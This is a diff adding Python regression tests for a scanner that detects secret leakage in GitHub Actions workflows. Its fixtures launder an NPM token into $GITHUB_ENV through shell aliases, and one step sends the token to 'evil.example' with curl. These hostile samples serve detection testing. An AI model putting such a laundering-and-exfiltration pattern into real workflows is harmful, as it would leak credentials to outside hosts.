@@ -162,3 +162,86 @@ jobs:
         f"pathological workflow took {elapsed:.3f}s — bounds broken"
     )
     del hits
+
+
+# ---------------------------------------------------------------------------
+# Alias-set blowup — pre-fix ran one full-body regex scan PER alias
+# per iteration (~50k scans for a body with ~50k alias assignments)
+# ---------------------------------------------------------------------------
+
+def test_alias_flood_completes_in_seconds(tmp_path: Path) -> None:
+    """5,000 direct alias assignments in one run body.  Pre-fix,
+    iteration 2 of ``_aliased_targets`` ran one full-body scan per
+    alias found in iteration 1 — thousands of scans over a large
+    body.  Post-fix: one combined-alternation scan per iteration
+    (O(depth) full-body scans) with the alias set capped."""
+    header = """\
+on: push
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+"""
+    lines = [f"          V{i}=$GITHUB_ENV" for i in range(5000)]
+    lines.append(
+        '          echo "K=${{ secrets.NPM_TOKEN }}" >> $V42')
+    _write_wf(tmp_path, header + "\n".join(lines) + "\n")
+    t0 = time.monotonic()
+    hits = gha_secret_flow.scan_target(tmp_path, [], [])
+    elapsed = time.monotonic() - t0
+    assert elapsed < 5.0, (
+        f"5,000-alias body took {elapsed:.3f}s — alias-set scan "
+        f"blowup regression"
+    )
+    del hits
+
+
+def test_alias_set_is_capped() -> None:
+    body = "\n".join(f"V{i}=$GITHUB_ENV" for i in range(5000))
+    aliases = gha_secret_flow._aliased_targets(body, "GITHUB_ENV")
+    assert len(aliases) <= gha_secret_flow._MAX_ALIAS_SET_SIZE
+
+
+def test_alias_chain_semantics_pinned_small_case() -> None:
+    """Depth-6 chain semantics for small alias sets must be identical
+    pre/post the combined-alternation rewrite — expected output pinned
+    exactly."""
+    body = (
+        "A=$GITHUB_ENV\n"
+        'B="$A"\n'
+        "C=${B}\n"
+        "T=GITHUB_ENV\n"          # indirection target (literal)
+        "UNRELATED=$OTHER\n"
+    )
+    aliases = gha_secret_flow._aliased_targets(body, "GITHUB_ENV")
+    assert sorted(aliases) == ["A", "B", "C", "T"]
+
+
+def test_alias_redirect_small_case_results_pinned(tmp_path: Path) -> None:
+    """End-to-end canonical case: taint laundered to $GITHUB_ENV via
+    an alias, consumed by a later step with egress.  Results pinned so
+    the alias-scan rewrite can't silently change detection output."""
+    wf = """\
+on: push
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    steps:
+      - name: launder
+        run: |
+          T=$GITHUB_ENV
+          echo "LEAK=${{ secrets.NPM_TOKEN }}" >> $T
+      - name: use
+        run: |
+          curl https://evil.example/?x=$LEAK
+"""
+    _write_wf(tmp_path, wf)
+    hits = gha_secret_flow.scan_target(tmp_path, [], [])
+    assert [
+        (h.job_id, h.step_index, h.sink_kind, h.secret_names, h.severity)
+        for h in hits
+    ] == [
+        ("j", 0, "run_block", ("NPM_TOKEN",), "medium"),
+        ("j", 1, "run_block", ("NPM_TOKEN",), "high"),
+    ]
